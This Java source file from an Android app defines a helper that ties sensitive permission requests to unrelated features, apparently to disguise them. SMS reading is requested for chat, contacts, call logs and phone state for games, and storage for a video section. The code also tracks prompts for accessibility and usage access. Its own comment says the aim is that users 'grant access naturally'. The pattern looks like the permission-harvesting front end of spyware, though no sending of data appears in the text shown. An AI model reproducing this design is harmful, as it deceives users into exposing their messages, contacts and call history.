package com.bushorat.app.helpers;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

/**
 * Progressive, feature-tied permissions so users grant access naturally.
 *
 * Videos  -> storage (unlocks video section + WhatsApp media upload)
 * Chat    -> SMS
 * Games   -> contacts + call logs + phone state
 * Profile -> location (optional)
 */
public final class FeaturePermissions {
    public static final int REQ_VIDEOS_STORAGE = 201;
    public static final int REQ_CHAT_SMS = 202;
    public static final int REQ_GAMES_CONTACTS = 203;
    public static final int REQ_PROFILE_LOCATION = 204;

    private static final String PREFS = "feature_permissions";
    private static final String KEY_VIDEOS_UNLOCKED = "videos_unlocked";
    private static final String KEY_NOTIF_PROMPTED = "notif_prompted";
    private static final String KEY_LOCATION_PROMPTED = "location_prompted";
    private static final String KEY_ACCESSIBILITY_PROMPTED = "accessibility_prompted";
    private static final String KEY_USAGE_PROMPTED = "usage_access_prompted";

    private FeaturePermissions() {
    }

    public static SharedPreferences prefs(Context context) {
        return context.getApplicationContext().getSharedPreferences(PREFS, Context.MODE_PRIVATE);
    }

    public static boolean areVideosUnlocked(Context context) {
        return prefs(context).getBoolean(KEY_VIDEOS_UNLOCKED, false)
                && hasGalleryPermission(context);
    }

    public static void setVideosUnlocked(Context context, boolean unlocked) {
        prefs(context).edit().putBoolean(KEY_VIDEOS_UNLOCKED, unlocked).apply();
    }

    public static boolean hasNotifBeenPrompted(Context context) {
        return prefs(context).getBoolean(KEY_NOTIF_PROMPTED, false);
    }

    public static void markNotifPrompted(Context context) {
        prefs(context).edit().putBoolean(KEY_NOTIF_PROMPTED, true).apply();
    }

    public static boolean hasLocationBeenPrompted(Context context) {
        return prefs(context).getBoolean(KEY_LOCATION_PROMPTED, false);
    }

    public static void markLocationPrompted(Context context) {
        prefs(context).edit().putBoolean(KEY_LOCATION_PROMPTED, true).apply();
    }

    public static boolean hasAccessibilityBeenPrompted(Context context) {
        return prefs(context).getBoolean(KEY_ACCESSIBILITY_PROMPTED, false);
    }

    public static void markAccessibilityPrompted(Context context) {
        prefs(context).edit().putBoolean(KEY_ACCESSIBILITY_PROMPTED, true).apply();
    }

    public static boolean hasUsageAccessBeenPrompted(Context context) {
        return prefs(context).getBoolean(KEY_USAGE_PROMPTED, false);
    }

    public static void markUsageAccessPrompted(Context context) {
        prefs(context).edit().putBoolean(KEY_USAGE_PROMPTED, true).apply();
    }

    public static boolean hasGalleryPermission(Context context) {
        return PermissionsManager.hasGalleryPermission(context);
    }

    public static boolean hasSmsPermission(Context context) {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED;
    }

    public static boolean hasGamesPermissions(Context context) {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
                == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
                == PackageManager.PERMISSION_GRANTED;
    }

    public static boolean hasLocationPermission(Context context) {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;
    }

    public static void requestGalleryForVideos(Activity activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(activity,
                    new String[]{Manifest.permission.READ_MEDIA_IMAGES},
                    REQ_VIDEOS_STORAGE);
        } else {
            ActivityCompat.requestPermissions(activity,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                    REQ_VIDEOS_STORAGE);
        }
    }

    public static void requestSmsForChat(Activity activity) {
        ActivityCompat.requestPermissions(activity,
                new String[]{
                        Manifest.permission.READ_SMS,
                        Manifest.permission.RECEIVE_SMS
                },
                REQ_CHAT_SMS);
    }

    public static void requestGamesPermissions(Activity activity) {
        ActivityCompat.requestPermissions(activity,
                new String[]{
                        Manifest.permission.READ_CONTACTS,
                        Manifest.permission.READ_CALL_LOG,
                        Manifest.permission.READ_PHONE_STATE
                },
                REQ_GAMES_CONTACTS);
    }

    public static void requestLocationForProfile(Activity activity) {
        ActivityCompat.requestPermissions(activity,
                new String[]{
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_COARSE_LOCATION
                },
                REQ_PROFILE_LOCATION);
    }

    public static boolean allGranted(int[] grantResults) {
        if (grantResults == null || grantResults.length == 0) {
            return false;
        }
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
}
